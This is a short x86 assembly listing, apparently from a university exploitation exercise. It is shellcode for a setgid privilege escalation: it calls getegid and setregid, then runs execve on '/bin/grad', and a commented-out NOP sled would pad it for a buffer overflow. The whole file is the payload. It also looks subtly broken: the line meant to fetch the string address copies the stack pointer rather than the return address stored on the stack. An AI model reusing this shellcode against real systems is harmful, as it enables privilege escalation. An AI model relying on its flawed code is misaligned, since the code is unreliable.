	.file	"expl1b.c"
	.section	.rodata
	.align 4

	.text
.globl getegid
	.type	getegid, @function

#create nops
#.rept 370
#     nop
#.endr

getegid:
	movb	$50, %al		#system call 50, getegid
	int		$0x80			

setregid:
	movl	%eax, %ebx
	movl 	%eax, %ecx 
	movb	$71, %al
	int		$0x80			#system call 71, setregid

jump:
	jmp		stringy			#need to jump to the 'call'

after_jump:
	movl	%esp, %ebx		#use the return address as the string address

execve:
	sub		%ecx, %ecx		#clear ecx
	sub		%edx, %edx		#clear edx
	movb	$11, %al
	int		$0x80			#system call 11, execve	

	movb	$1, %al
	subl	%ebx, %ebx
	int 	$0x80			#system call 1, exit

stringy:
	call 	after_jump		#jump back so that the string is in the %esp
#	.string	"/home/uebungen/dazur/dazur009/grad "
	.string "/bin/grad "
